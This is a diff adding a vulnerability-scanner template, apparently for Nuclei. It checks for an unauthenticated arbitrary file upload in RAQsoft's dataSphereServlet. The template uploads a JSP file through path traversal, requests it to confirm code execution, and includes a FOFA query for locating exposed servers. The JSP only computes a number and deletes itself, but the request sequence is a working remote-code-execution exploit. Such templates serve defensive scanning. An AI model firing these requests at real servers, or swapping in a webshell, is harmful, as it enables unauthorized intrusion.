@@ -1,0 +1,68 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - status_code_2 == 200
+    - contains(body_2, '{{result}}')
+    type: dsl
+  raw:
+  - 'POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+
+    ----{{boundary}}
+
+    Content-Disposition: form-data; name="openGrpxFile"; filename="{{filename}}"
+
+    Content-Type: text/plain
+
+
+    <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();
+    %>
+
+    ----{{boundary}}
+
+    Content-Disposition: form-data; name="path"
+
+
+    ../../../
+
+    ----{{boundary}}
+
+    Content-Disposition: form-data; name="saveServer"
+
+
+    1
+
+    ----{{boundary}}--
+
+    '
+  - 'GET /demo/{{filename}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: raqsoft-dataSphereServlet-file-upload
+info:
+  author: Co5mos
+  description: "\u6DA6\u4E7E\u62A5\u8868 dataSphereServlet \u63A5\u53E3\u5B58\u5728\
+    \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u672A\u7ECF\u8EAB\u4EFD\
+    \u9A8C\u8BC1\u7684\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u8BE5\u6F0F\u6D1E\
+    \u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\uFF0C\u4ECE\u800C\u83B7\u53D6\u670D\u52A1\
+    \u5668\u6743\u9650\u3002\n"
+  metadata:
+    fofa-query: body="/raqsoft"
+  name: RAQsoft dataSphereServlet Arbitrary File Upload
+  reference:
+  - https://github.com/wy876/POC/blob/main/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8dataSphereServlet%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  severity: critical
+  tags: raqsoft, fileupload, rce
+variables:
+  boundary: '{{rand_base(20)}}'
+  filename: '{{rand_base(6)}}.jsp'
+  num1: '{{rand_int(10000, 20000)}}'
+  num2: '{{rand_int(10000, 20000)}}'
+  result: '{{to_number(num1)*to_number(num2)}}'
